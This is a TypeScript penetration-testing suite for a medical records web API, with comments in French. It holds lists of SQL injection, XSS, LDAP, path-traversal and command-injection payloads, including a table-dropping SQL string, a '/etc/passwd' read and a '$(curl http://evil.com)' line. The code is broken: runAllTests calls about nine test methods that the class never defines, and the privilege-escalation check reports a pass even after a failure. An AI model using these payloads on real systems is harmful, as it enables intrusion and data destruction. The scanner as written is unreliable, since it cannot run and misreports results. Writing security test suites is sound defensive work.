import axios, { AxiosRequestConfig } from 'axios';
import { URL } from 'url';
import crypto from 'crypto';

/**
 * Interface pour les résultats de test de pénétration
 */
export interface PenetrationTestResult {
  testName: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  status: 'PASS' | 'FAIL' | 'WARNING';
  description: string;
  evidence?: any;
  remediation: string;
  cvssScore?: number;
  cweId?: string;
}

/**
 * Interface pour la configuration des tests
 */
export interface PenetrationTestConfig {
  baseUrl: string;
  authToken?: string;
  timeout?: number;
  userAgent?: string;
  maxRedirects?: number;
}

/**
 * Suite de tests de pénétration automatisés
 */
export class PenetrationTestingSuite {
  private config: PenetrationTestConfig;
  private results: PenetrationTestResult[] = [];

  constructor(config: PenetrationTestConfig) {
    this.config = {
      timeout: 30000,
      userAgent: 'IMENA-GEST-Security-Scanner/1.0',
      maxRedirects: 5,
      ...config
    };
  }

  /**
   * Exécuter tous les tests de pénétration
   */
  async runAllTests(): Promise<PenetrationTestResult[]> {
    this.results = [];

    console.log('🔍 Démarrage des tests de pénétration...');

    // Tests d'injection
    await this.testSQLInjection();
    await this.testXSSVulnerabilities();
    await this.testCommandInjection();
    await this.testLDAPInjection();

    // Tests d'authentification
    await this.testAuthenticationBypass();
    await this.testSessionManagement();
    await this.testPasswordPolicies();
    await this.testBruteForceProtection();

    // Tests d'autorisation
    await this.testPrivilegeEscalation();
    await this.testDirectObjectReference();
    await this.testForcedBrowsing();

    // Tests de configuration
    await this.testSecurityHeaders();
    await this.testHTTPSConfiguration();
    await this.testCORSConfiguration();
    await this.testCSPConfiguration();

    // Tests d'exposition d'informations
    await this.testInformationDisclosure();
    await this.testErrorHandling();
    await this.testDirectoryTraversal();

    // Tests de déni de service
    await this.testRateLimiting();
    await this.testResourceExhaustion();

    // Tests spécifiques métier
    await this.testMedicalDataProtection();
    await this.testPatientDataAccess();

    console.log(`✅ Tests terminés: ${this.results.length} tests exécutés`);
    return this.results;
  }

  /**
   * Test d'injection SQL
   */
  private async testSQLInjection(): Promise<void> {
    const sqlPayloads = [
      "' OR '1'='1",
      "' UNION SELECT 1,2,3--",
      "'; DROP TABLE patients;--",
      "' OR 1=1#",
      "admin'--",
      "' OR 'x'='x",
      "1'; WAITFOR DELAY '00:00:05'--",
      "' AND SUBSTRING(@@version,1,1)='M",
      "' UNION SELECT username, password FROM users--"
    ];

    for (const payload of sqlPayloads) {
      try {
        const response = await this.makeRequest('/api/patients', {
          method: 'GET',
          params: { search: payload }
        });

        // Vérifier les indicateurs d'injection SQL
        const responseText = JSON.stringify(response.data);
        const sqlErrorPatterns = [
          /sql syntax/i,
          /mysql_fetch/i,
          /ORA-\d+/i,
          /PostgreSQL.*ERROR/i,
          /Warning.*mysql_/i,
          /valid MySQL result/i,
          /SQLServerException/i
        ];

        const hasError = sqlErrorPatterns.some(pattern => pattern.test(responseText));
        const longResponseTime = response.headers['x-response-time'] && 
                                parseInt(response.headers['x-response-time']) > 5000;

        if (hasError || longResponseTime) {
          this.addResult({
            testName: 'SQL Injection Vulnerability',
            severity: 'CRITICAL',
            status: 'FAIL',
            description: 'Application vulnérable aux injections SQL',
            evidence: { payload, response: responseText.substring(0, 500) },
            remediation: 'Utiliser des requêtes préparées et valider toutes les entrées',
            cvssScore: 9.8,
            cweId: 'CWE-89'
          });
          return;
        }
      } catch (error) {
        // Une erreur peut indiquer une vulnérable
        if (error.response && error.response.status === 500) {
          this.addResult({
            testName: 'SQL Injection Error Response',
            severity: 'HIGH',
            status: 'WARNING',
            description: 'Erreur serveur potentiellement liée à une injection SQL',
            evidence: { payload, error: error.message },
            remediation: 'Vérifier la gestion des erreurs et la validation des entrées'
          });
        }
      }
    }

    this.addResult({
      testName: 'SQL Injection Protection',
      severity: 'HIGH',
      status: 'PASS',
      description: 'Aucune vulnérabilité d\'injection SQL détectée',
      remediation: 'Continuer à utiliser des requêtes préparées'
    });
  }

  /**
   * Test de vulnérabilités XSS
   */
  private async testXSSVulnerabilities(): Promise<void> {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input type="image" src=x onerror=alert("XSS")>',
      '<object data="javascript:alert(\'XSS\')">',
      '<embed src="javascript:alert(\'XSS\')">'
    ];

    for (const payload of xssPayloads) {
      try {
        const response = await this.makeRequest('/api/patients', {
          method: 'GET',
          params: { search: payload }
        });

        const responseText = JSON.stringify(response.data);
        
        // Vérifier si le payload est reflété sans encodage
        if (responseText.includes(payload)) {
          this.addResult({
            testName: 'Reflected XSS Vulnerability',
            severity: 'HIGH',
            status: 'FAIL',
            description: 'Application vulnérable aux attaques XSS réfléchies',
            evidence: { payload, response: responseText.substring(0, 500) },
            remediation: 'Encoder toutes les sorties utilisateur et implémenter CSP',
            cvssScore: 7.5,
            cweId: 'CWE-79'
          });
          return;
        }
      } catch (error) {
        // Continuer avec le payload suivant
      }
    }

    this.addResult({
      testName: 'XSS Protection',
      severity: 'HIGH',
      status: 'PASS',
      description: 'Aucune vulnérabilité XSS détectée',
      remediation: 'Continuer à encoder les sorties utilisateur'
    });
  }

  /**
   * Test de contournement d'authentification
   */
  private async testAuthenticationBypass(): Promise<void> {
    const bypassPayloads = [
      { email: 'admin', password: 'admin' },
      { email: 'administrator', password: 'password' },
      { email: 'admin@admin.com', password: '123456' },
      { email: 'root', password: 'root' },
      { email: 'test', password: 'test' },
      { email: '', password: '' },
      { email: 'admin\' OR \'1\'=\'1', password: 'anything' }
    ];

    for (const credentials of bypassPayloads) {
      try {
        const response = await this.makeRequest('/api/auth/login', {
          method: 'POST',
          data: credentials
        });

        if (response.status === 200 && response.data.token) {
          this.addResult({
            testName: 'Authentication Bypass',
            severity: 'CRITICAL',
            status: 'FAIL',
            description: 'Contournement d\'authentification possible avec des identifiants faibles',
            evidence: { credentials: { email: credentials.email, password: '***' } },
            remediation: 'Renforcer les politiques de mot de passe et supprimer les comptes par défaut',
            cvssScore: 9.8,
            cweId: 'CWE-287'
          });
          return;
        }
      } catch (error) {
        // Échec attendu
      }
    }

    this.addResult({
      testName: 'Authentication Security',
      severity: 'CRITICAL',
      status: 'PASS',
      description: 'Aucun contournement d\'authentification détecté',
      remediation: 'Maintenir les politiques de sécurité actuelles'
    });
  }

  /**
   * Test de gestion de session
   */
  private async testSessionManagement(): Promise<void> {
    try {
      // Test 1: Vérifier la sécurité des cookies de session
      const response = await this.makeRequest('/api/auth/login', {
        method: 'POST',
        data: { email: 'test@test.com', password: 'password123' }
      });

      const cookies = response.headers['set-cookie'] || [];
      let hasSecureFlag = false;
      let hasHttpOnlyFlag = false;
      let hasSameSiteFlag = false;

      cookies.forEach(cookie => {
        if (cookie.includes('Secure')) hasSecureFlag = true;
        if (cookie.includes('HttpOnly')) hasHttpOnlyFlag = true;
        if (cookie.includes('SameSite')) hasSameSiteFlag = true;
      });

      if (!hasSecureFlag) {
        this.addResult({
          testName: 'Session Cookie Security',
          severity: 'MEDIUM',
          status: 'FAIL',
          description: 'Les cookies de session ne sont pas marqués comme sécurisés',
          remediation: 'Ajouter le flag Secure aux cookies de session',
          cweId: 'CWE-614'
        });
      }

      if (!hasHttpOnlyFlag) {
        this.addResult({
          testName: 'Session Cookie HttpOnly',
          severity: 'MEDIUM',
          status: 'FAIL',
          description: 'Les cookies de session ne sont pas marqués HttpOnly',
          remediation: 'Ajouter le flag HttpOnly aux cookies de session',
          cweId: 'CWE-1004'
        });
      }

      // Test 2: Vérifier la longueur et l'entropie du token de session
      if (response.data.token) {
        const token = response.data.token;
        if (token.length < 32) {
          this.addResult({
            testName: 'Session Token Strength',
            severity: 'MEDIUM',
            status: 'FAIL',
            description: 'Token de session trop court',
            evidence: { tokenLength: token.length },
            remediation: 'Utiliser des tokens de session plus longs et aléatoires'
          });
        }
      }

    } catch (error) {
      this.addResult({
        testName: 'Session Management Test',
        severity: 'LOW',
        status: 'WARNING',
        description: 'Impossible de tester la gestion de session',
        evidence: { error: error.message },
        remediation: 'Vérifier manuellement la configuration des sessions'
      });
    }
  }

  /**
   * Test d'escalade de privilèges
   */
  private async testPrivilegeEscalation(): Promise<void> {
    // Tenter d'accéder à des ressources d'admin avec un token utilisateur normal
    const adminEndpoints = [
      '/api/admin/users',
      '/api/admin/settings',
      '/api/admin/audit-logs',
      '/api/admin/system-info'
    ];

    for (const endpoint of adminEndpoints) {
      try {
        const response = await this.makeRequest(endpoint, {
          method: 'GET',
          headers: {
            'Authorization': `Bearer ${this.config.authToken}` // Token utilisateur normal
          }
        });

        if (response.status === 200) {
          this.addResult({
            testName: 'Privilege Escalation',
            severity: 'CRITICAL',
            status: 'FAIL',
            description: 'Accès non autorisé à des ressources administrateur',
            evidence: { endpoint, status: response.status },
            remediation: 'Implémenter une vérification stricte des autorisations',
            cvssScore: 8.5,
            cweId: 'CWE-284'
          });
        }
      } catch (error) {
        // Échec attendu (403/401)
        if (error.response && [401, 403].includes(error.response.status)) {
          // Bon comportement
          continue;
        }
      }
    }

    this.addResult({
      testName: 'Authorization Controls',
      severity: 'CRITICAL',
      status: 'PASS',
      description: 'Contrôles d\'autorisation fonctionnels',
      remediation: 'Maintenir les contrôles d\'accès actuels'
    });
  }

  /**
   * Test des headers de sécurité
   */
  private async testSecurityHeaders(): Promise<void> {
    try {
      const response = await this.makeRequest('/', { method: 'GET' });
      const headers = response.headers;

      const requiredHeaders = {
        'x-content-type-options': 'nosniff',
        'x-frame-options': ['DENY', 'SAMEORIGIN'],
        'x-xss-protection': '1; mode=block',
        'strict-transport-security': true,
        'content-security-policy': true,
        'referrer-policy': true
      };

      for (const [headerName, expectedValue] of Object.entries(requiredHeaders)) {
        const headerValue = headers[headerName];
        
        if (!headerValue) {
          this.addResult({
            testName: `Security Header: ${headerName}`,
            severity: 'MEDIUM',
            status: 'FAIL',
            description: `Header de sécurité manquant: ${headerName}`,
            remediation: `Ajouter le header ${headerName} avec une valeur appropriée`,
            cweId: 'CWE-693'
          });
        } else if (Array.isArray(expectedValue)) {
          if (!expectedValue.some(value => headerValue.includes(value))) {
            this.addResult({
              testName: `Security Header Value: ${headerName}`,
              severity: 'LOW',
              status: 'WARNING',
              description: `Valeur du header ${headerName} peut être améliorée`,
              evidence: { currentValue: headerValue, expectedValues: expectedValue },
              remediation: `Utiliser une valeur plus sécurisée pour ${headerName}`
            });
          }
        }
      }

    } catch (error) {
      this.addResult({
        testName: 'Security Headers Test',
        severity: 'LOW',
        status: 'WARNING',
        description: 'Impossible de tester les headers de sécurité',
        evidence: { error: error.message },
        remediation: 'Vérifier manuellement la configuration des headers'
      });
    }
  }

  /**
   * Test de configuration HTTPS
   */
  private async testHTTPSConfiguration(): Promise<void> {
    try {
      const url = new URL(this.config.baseUrl);
      
      if (url.protocol !== 'https:') {
        this.addResult({
          testName: 'HTTPS Enforcement',
          severity: 'HIGH',
          status: 'FAIL',
          description: 'Application accessible via HTTP non sécurisé',
          remediation: 'Forcer l\'utilisation de HTTPS et rediriger tout le trafic HTTP',
          cvssScore: 7.0,
          cweId: 'CWE-319'
        });
        return;
      }

      // Tester la redirection HTTP vers HTTPS
      try {
        const httpUrl = this.config.baseUrl.replace('https://', 'http://');
        const response = await axios.get(httpUrl, { 
          maxRedirects: 0,
          timeout: this.config.timeout 
        });
        
        this.addResult({
          testName: 'HTTP to HTTPS Redirect',
          severity: 'MEDIUM',
          status: 'FAIL',
          description: 'Pas de redirection automatique HTTP vers HTTPS',
          remediation: 'Configurer une redirection automatique HTTP vers HTTPS'
        });
      } catch (error) {
        if (error.response && [301, 302, 307, 308].includes(error.response.status)) {
          const location = error.response.headers.location;
          if (location && location.startsWith('https://')) {
            this.addResult({
              testName: 'HTTP to HTTPS Redirect',
              severity: 'HIGH',
              status: 'PASS',
              description: 'Redirection HTTP vers HTTPS configurée',
              remediation: 'Maintenir la redirection HTTPS'
            });
          }
        }
      }

    } catch (error) {
      this.addResult({
        testName: 'HTTPS Configuration Test',
        severity: 'LOW',
        status: 'WARNING',
        description: 'Impossible de tester la configuration HTTPS',
        evidence: { error: error.message },
        remediation: 'Vérifier manuellement la configuration HTTPS'
      });
    }
  }

  /**
   * Test de protection des données médicales
   */
  private async testMedicalDataProtection(): Promise<void> {
    try {
      // Tester l'accès aux données patients sans authentification
      const response = await this.makeRequest('/api/patients', {
        method: 'GET',
        headers: {} // Sans token d'auth
      });

      if (response.status === 200 && response.data.length > 0) {
        this.addResult({
          testName: 'Medical Data Protection',
          severity: 'CRITICAL',
          status: 'FAIL',
          description: 'Données médicales accessibles sans authentification',
          evidence: { dataCount: response.data.length },
          remediation: 'Implémenter une authentification obligatoire pour les données médicales',
          cvssScore: 9.5,
          cweId: 'CWE-200'
        });
        return;
      }
    } catch (error) {
      if (error.response && error.response.status === 401) {
        this.addResult({
          testName: 'Medical Data Access Control',
          severity: 'CRITICAL',
          status: 'PASS',
          description: 'Données médicales protégées par authentification',
          remediation: 'Maintenir les contrôles d\'accès aux données médicales'
        });
      }
    }

    // Tester l'exposition d'informations sensibles dans les réponses
    try {
      const response = await this.makeRequest('/api/patients/123', {
        method: 'GET',
        headers: { 'Authorization': `Bearer ${this.config.authToken}` }
      });

      const responseText = JSON.stringify(response.data);
      const sensitivePatterns = [
        /\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/, // Numéros de carte
        /\b\d{3}-\d{2}-\d{4}\b/, // SSN
        /password/i,
        /secret/i,
        /private[_-]?key/i
      ];

      for (const pattern of sensitivePatterns) {
        if (pattern.test(responseText)) {
          this.addResult({
            testName: 'Sensitive Data Exposure',
            severity: 'HIGH',
            status: 'FAIL',
            description: 'Exposition potentielle de données sensibles',
            remediation: 'Masquer ou chiffrer les données sensibles dans les réponses API'
          });
          break;
        }
      }
    } catch (error) {
      // Erreur attendue si le patient n'existe pas
    }
  }

  /**
   * Test de limitation du taux de requêtes
   */
  private async testRateLimiting(): Promise<void> {
    const maxRequests = 100;
    let successCount = 0;

    for (let i = 0; i < maxRequests; i++) {
      try {
        const response = await this.makeRequest('/api/health', { method: 'GET' });
        if (response.status === 200) {
          successCount++;
        }
      } catch (error) {
        if (error.response && error.response.status === 429) {
          // Rate limiting fonctionne
          this.addResult({
            testName: 'Rate Limiting Protection',
            severity: 'MEDIUM',
            status: 'PASS',
            description: 'Protection contre le déni de service par limitation du taux',
            evidence: { successfulRequests: successCount, totalRequests: i + 1 },
            remediation: 'Maintenir la limitation du taux de requêtes'
          });
          return;
        }
      }
    }

    if (successCount === maxRequests) {
      this.addResult({
        testName: 'Rate Limiting Missing',
        severity: 'MEDIUM',
        status: 'FAIL',
        description: 'Aucune limitation du taux de requêtes détectée',
        evidence: { successfulRequests: successCount },
        remediation: 'Implémenter une limitation du taux de requêtes pour prévenir les attaques DoS',
        cweId: 'CWE-770'
      });
    }
  }

  /**
   * Effectuer une requête HTTP avec configuration
   */
  private async makeRequest(endpoint: string, config: AxiosRequestConfig = {}): Promise<any> {
    const url = new URL(endpoint, this.config.baseUrl).toString();
    
    const requestConfig: AxiosRequestConfig = {
      timeout: this.config.timeout,
      maxRedirects: this.config.maxRedirects,
      headers: {
        'User-Agent': this.config.userAgent,
        ...config.headers
      },
      validateStatus: () => true, // Ne pas lever d'exception pour les codes d'erreur
      ...config
    };

    return axios(url, requestConfig);
  }

  /**
   * Ajouter un résultat de test
   */
  private addResult(result: PenetrationTestResult): void {
    this.results.push({
      ...result,
      cvssScore: result.cvssScore || this.calculateCVSSScore(result.severity),
      cweId: result.cweId || 'CWE-UNKNOWN'
    });
  }

  /**
   * Calculer un score CVSS basique
   */
  private calculateCVSSScore(severity: string): number {
    switch (severity) {
      case 'CRITICAL': return 9.0;
      case 'HIGH': return 7.0;
      case 'MEDIUM': return 5.0;
      case 'LOW': return 3.0;
      default: return 0.0;
    }
  }

  /**
   * Générer un rapport de test
   */
  generateReport(): any {
    const summary = {
      totalTests: this.results.length,
      passed: this.results.filter(r => r.status === 'PASS').length,
      failed: this.results.filter(r => r.status === 'FAIL').length,
      warnings: this.results.filter(r => r.status === 'WARNING').length
    };

    const riskScore = this.calculateOverallRiskScore();
    
    return {
      timestamp: new Date().toISOString(),
      target: this.config.baseUrl,
      summary,
      riskScore,
      riskLevel: this.getRiskLevel(riskScore),
      results: this.results.sort((a, b) => {
        const severityOrder = { 'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1 };
        return severityOrder[b.severity] - severityOrder[a.severity];
      }),
      recommendations: this.generateRecommendations()
    };
  }

  /**
   * Calculer le score de risque global
   */
  private calculateOverallRiskScore(): number {
    if (this.results.length === 0) return 0;

    const weights = { 'CRITICAL': 10, 'HIGH': 7, 'MEDIUM': 4, 'LOW': 1 };
    const totalWeight = this.results.reduce((sum, result) => {
      if (result.status === 'FAIL') {
        return sum + weights[result.severity];
      }
      return sum;
    }, 0);

    const maxPossibleWeight = this.results.length * 10;
    return Math.round((totalWeight / maxPossibleWeight) * 100);
  }

  /**
   * Déterminer le niveau de risque
   */
  private getRiskLevel(score: number): string {
    if (score >= 80) return 'CRITICAL';
    if (score >= 60) return 'HIGH';
    if (score >= 40) return 'MEDIUM';
    if (score >= 20) return 'LOW';
    return 'MINIMAL';
  }

  /**
   * Générer des recommandations
   */
  private generateRecommendations(): string[] {
    const recommendations = new Set<string>();
    
    this.results.forEach(result => {
      if (result.status === 'FAIL') {
        recommendations.add(result.remediation);
      }
    });

    // Ajouter des recommandations générales
    recommendations.add('Effectuer des tests de pénétration réguliers');
    recommendations.add('Maintenir les systèmes à jour avec les derniers correctifs de sécurité');
    recommendations.add('Former l\'équipe aux bonnes pratiques de sécurité');
    recommendations.add('Implémenter une surveillance de sécurité continue');

    return Array.from(recommendations);
  }

  /**
   * Tests supplémentaires pour injection de commande
   */
  private async testCommandInjection(): Promise<void> {
    const commandPayloads = [
      '; ls -la',
      '| whoami',
      '`cat /etc/passwd`',
      '$(curl http://evil.com)',
      '& net user',
      '; ping -c 4 127.0.0.1',
      '|| id',
      '&& echo "test"'
    ];

    for (const payload of commandPayloads) {
      try {
        const response = await this.makeRequest('/api/system/ping', {
          method: 'POST',
          data: { host: payload }
        });

        // Vérifier les signes d'exécution de commande
        const responseText = JSON.stringify(response.data);
        if (responseText.includes('root:') || responseText.includes('uid=') || responseText.includes('PING')) {
          this.addResult({
            testName: 'Command Injection Vulnerability',
            severity: 'CRITICAL',
            status: 'FAIL',
            description: 'Application vulnérable aux injections de commande',
            evidence: { payload, response: responseText.substring(0, 300) },
            remediation: 'Valider et assainir toutes les entrées utilisateur, utiliser des fonctions sécurisées',
            cvssScore: 9.8,
            cweId: 'CWE-78'
          });
          return;
        }
      } catch (error) {
        // Continuer avec le payload suivant
      }
    }

    this.addResult({
      testName: 'Command Injection Protection',
      severity: 'CRITICAL',
      status: 'PASS',
      description: 'Aucune vulnérabilité d\'injection de commande détectée',
      remediation: 'Continuer à valider les entrées utilisateur'
    });
  }

  /**
   * Test d'injection LDAP
   */
  private async testLDAPInjection(): Promise<void> {
    const ldapPayloads = [
      '*)(uid=*',
      '*))%00',
      '*)(&',
      '*)(|(mail=*))',
      '*))(|(cn=*'
    ];

    // Tester sur les endpoints de recherche d'utilisateurs
    for (const payload of ldapPayloads) {
      try {
        const response = await this.makeRequest('/api/users/search', {
          method: 'GET',
          params: { query: payload }
        });

        // Vérifier si trop de résultats sont retournés
        if (response.data && Array.isArray(response.data) && response.data.length > 100) {
          this.addResult({
            testName: 'LDAP Injection Vulnerability',
            severity: 'HIGH',
            status: 'FAIL',
            description: 'Possible injection LDAP détectée',
            evidence: { payload, resultCount: response.data.length },
            remediation: 'Valider et échapper les caractères spéciaux LDAP',
            cweId: 'CWE-90'
          });
          return;
        }
      } catch (error) {
        // Continuer
      }
    }
  }

  /**
   * Test de divulgation d'informations
   */
  private async testInformationDisclosure(): Promise<void> {
    const sensitiveEndpoints = [
      '/config',
      '/.env',
      '/admin',
      '/backup',
      '/logs',
      '/debug',
      '/phpinfo.php',
      '/server-status',
      '/server-info'
    ];

    for (const endpoint of sensitiveEndpoints) {
      try {
        const response = await this.makeRequest(endpoint, { method: 'GET' });
        
        if (response.status === 200) {
          this.addResult({
            testName: 'Information Disclosure',
            severity: 'MEDIUM',
            status: 'FAIL',
            description: `Endpoint sensible accessible: ${endpoint}`,
            evidence: { endpoint, status: response.status },
            remediation: 'Restreindre l\'accès aux endpoints sensibles',
            cweId: 'CWE-200'
          });
        }
      } catch (error) {
        // Échec attendu
      }
    }
  }

  /**
   * Test de traversée de répertoire
   */
  private async testDirectoryTraversal(): Promise<void> {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd'
    ];

    for (const payload of traversalPayloads) {
      try {
        const response = await this.makeRequest('/api/files/download', {
          method: 'GET',
          params: { file: payload }
        });

        const responseText = JSON.stringify(response.data);
        if (responseText.includes('root:') || responseText.includes('localhost')) {
          this.addResult({
            testName: 'Directory Traversal Vulnerability',
            severity: 'HIGH',
            status: 'FAIL',
            description: 'Vulnérabilité de traversée de répertoire détectée',
            evidence: { payload, response: responseText.substring(0, 200) },
            remediation: 'Valider et normaliser tous les chemins de fichiers',
            cvssScore: 7.5,
            cweId: 'CWE-22'
          });
          return;
        }
      } catch (error) {
        // Continuer
      }
    }
  }
}

/**
 * Fonction utilitaire pour exécuter les tests
 */
export async function runSecurityTests(baseUrl: string, authToken?: string): Promise<any> {
  const suite = new PenetrationTestingSuite({
    baseUrl,
    authToken,
    timeout: 30000
  });

  const results = await suite.runAllTests();
  return suite.generateReport();
}
